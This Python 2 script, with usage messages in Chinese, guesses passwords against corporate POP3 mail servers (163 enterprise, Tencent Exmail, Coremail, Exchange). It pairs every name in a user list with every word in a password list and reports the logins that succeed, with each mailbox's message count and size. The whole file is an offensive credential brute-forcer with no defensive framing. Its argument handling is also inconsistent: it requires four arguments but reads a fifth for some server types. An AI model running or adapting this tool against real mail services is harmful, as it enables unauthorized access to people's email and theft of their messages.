#!usr/bin/python 
#!coding:utf-8 

import threading,time,random,sys,poplib 
from copy import copy 

if len(sys.argv) !=4: 
    print "\t    Note: 邮箱类型为：'163','tencent','coremail','236','exchange' \n" 
    print "\t    Note: coremail|exchange 用户字典不需要域名后缀，例如zhangsan\n" 
    print "\t    Note: 163|tencent|236 用户字典需要域名后缀，例如zhangsan@domain.com\n" 
    print "\t    Usage: 163|tencent使用方法：./mail.py type <userlist> <wordlist>\n" 
    print "\t    Usage: 236|exchange|coremail使用方法：./mail.py type <userlist> <wordlist> mail.domain.com\n"   

    sys.exit(1) 

mailType=['163','tencent','coremail','236','exchange'] 

if sys.argv[1] in ['236','exchange','coremail']: 
    try: 
        server = sys.argv[5] 
    except: 
        print '[-] Error: 236|exchange|coremail需要指定domain.com，请参考使用说明！\n' 
        sys.exit(1) 
elif sys.argv[1] == '163': 
    server = "pop.qiye.163.com" 
elif sys.argv[1] == 'tencent': 
    server = "pop.exmail.qq.com" 
else : 
    print "[-] Error: 邮箱类型错误\n" 
    sys.exit(1) 
     
success = [] 

try: 
    users_list = open(sys.argv[2], "r") 
    users = users_list.readlines() 
    words_list = open(sys.argv[3], "r") 
    words = words_list.readlines() 
except(IOError): 
    print "[-] Error: 请检查用户名或密码路径及文件\n" 
    sys.exit(1) 
finally: 
    users_list.close() 
    words_list.close() 
     
try: 
    if sys.argv[1] in ['163','236']: 
        pop = poplib.POP3(server,110)         
    else: 
        pop = poplib.POP3_SSL(server,995) 
    welcome = pop.getwelcome() 
    print welcome 
    pop.quit() 
except (poplib.error_proto): 
    welcome = "[-] Error: No Response,Something wrong!!!\n" 
    sys.exit(1) 

print "[+] Server:",server 
print "[+] Users Loaded:",len(users) 
print "[+] Words Loaded:",len(words) 
print "[+] Server response:",welcome,"\n" 

def mailbruteforce(listuser,listpwd,type): 
    if len(listuser) < 1 or len(listpwd) < 1 : 
        print "[-] Error: An error occurred: No user or pass list\n" 
        return 1 
     
    for user in listuser: 
        for passwd in listpwd : 
            user = user.replace("\n","") 
            passwd = passwd.replace("\n","") 
             
            try: 
                print "-"*12 
                print "[+] User:",user,"Password:",passwd 
                 
#                 time.sleep(0.1)       
                if type in ['163','236']: 
                    popserver = poplib.POP3(server,110)         
                else: 
                    popserver = poplib.POP3_SSL(server,995) 
                popserver.user(user) 
                auth = popserver.pass_(passwd) 
                print auth 
                 
                if auth.split(' ')[0] == "+OK" or auth =="+OK": 
                    ret = (user,passwd,popserver.stat()[0],popserver.stat()[1]) 
                    success.append(ret) 
                    #print len(success) 
                    popserver.quit() 
                    break 
                else : 
                    popserver.quit() 
                    continue 
             
            except: 
                #print "An error occurred:", msg 
                pass 

if __name__ == '__main__': 
    mailbruteforce(users,words,sys.argv[1]) 
     

    print "\t[+] have weakpass :\t",len(success) 
    if len(success) >=1: 
        for ret in success: 
            print "\n\n[+] Login successful:",ret[0], ret[1] 
            print "\t[+] Mail:",ret[2],"emails" 
            print "\t[+] Size:",ret[3],"bytes\n" 
    print "\n[-] Done"
